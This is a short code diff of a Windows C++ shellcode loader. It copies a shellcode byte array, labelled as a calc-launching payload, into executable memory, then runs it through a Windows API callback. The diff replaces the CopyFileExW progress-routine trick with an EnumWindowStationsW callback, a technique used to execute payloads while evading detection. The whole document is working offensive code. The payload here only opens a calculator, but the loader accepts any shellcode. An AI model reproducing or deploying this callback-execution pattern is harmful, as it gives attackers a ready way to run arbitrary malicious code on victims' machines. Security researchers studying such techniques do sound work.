@@ -1,6 +1,8 @@
 #include <windows.h>
 #include <stdio.h>
 
+
+
 // alfarom256 calc shellcode
 unsigned char op[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
@@ -31,7 +33,10 @@ int main() {
     LPVOID addr = ::VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ::RtlMoveMemory(addr, op, sizeof(op));
 
-    ::DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
-    ::CopyFileExW(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", (LPPROGRESS_ROUTINE)addr, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);
+    if (addr) {
+
+        ::EnumWindowStationsW((WINSTAENUMPROCW)addr, NULL);
+
+    }
 
 }
